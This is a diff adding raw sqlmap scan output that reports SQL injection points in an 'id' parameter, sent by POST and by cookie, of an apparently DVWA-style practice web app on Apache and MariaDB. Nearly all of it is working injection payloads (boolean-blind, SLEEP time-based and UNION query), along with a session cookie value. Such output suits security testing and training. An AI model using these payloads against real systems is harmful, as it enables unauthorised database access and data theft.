@@ -1,0 +1,32 @@
+sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: id=1' AND 2493=(SELECT (CASE WHEN (2493=2493) THEN 2493 ELSE (SELECT 4120 UNION SELECT 5884) END))-- -&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1659 FROM (SELECT(SLEEP(5)))fsDv)-- GAzE&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CONCAT(0x716a7a7171,0x445667786650415176716d41566451537a6c6373496e6f6b5a425343636a4d4743704c7350584442,0x71716b7071),NULL-- -&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap identified the following injection point(s) with a total of 852 HTTP(s) requests:
+---
+Parameter: id (Cookie)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 3215=3215-- LFmD; security=high; PHPSESSID=p4hmeh1js5ic9mdfb61eqi3ai5
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1059 FROM (SELECT(SLEEP(5)))MexE)-- SwuH; security=high; PHPSESSID=p4hmeh1js5ic9mdfb61eqi3ai5
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
